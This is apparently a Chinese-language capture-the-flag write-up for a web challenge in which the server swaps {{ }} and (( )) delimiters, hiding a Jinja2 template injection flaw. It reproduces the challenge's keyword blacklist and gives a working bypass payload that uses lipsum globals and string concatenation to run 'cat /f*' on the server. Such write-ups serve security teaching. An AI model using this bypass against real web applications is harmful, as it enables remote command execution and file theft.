题目描述：魔镜魔镜，告诉我谁是r00t最帅的人？

题解：

给了hint.py，将输入开头和结尾的{{}}与(())对调

```python
def transform_input(user_input):
    user_input = user_input.strip()
    if user_input.startswith('{{') and user_input.endswith('}}'):
        return '((' + user_input[2:-2] + '))'
    elif user_input.startswith('((') and user_input.endswith('))'):
        return '{{' + user_input[2:-2] + '}}'
    return user_input
```

为什么要这样干呢？是为了防止你们用fenjing一把梭😀

熟悉的看到{{}}应该就能反应过来是ssti，没反应过来也没关系，先尝试一下输入{{7\*7}}

![Pasted image 20251208142100](魔镜.assets/Pasted image 20251208142100.png)

那输入((7\*7))看看

![Pasted image 20251208142140](魔镜.assets/Pasted image 20251208142140.png)

显示49，说明有ssti漏洞

这里做了简单的过滤

```python
    blacklist = [
        "config", "self", "class", "mro", "base", "import", 
        "os", "eval", "popen", "flag", "subprocess"
    ]
```

没有过滤lipsum,其他关键词可以用字符串拼接来绕过

```python
((lipsum.__globals__['o''s']['pop''en']('cat /f*').read()))
```

payload并不唯一，大家可以去探索一下。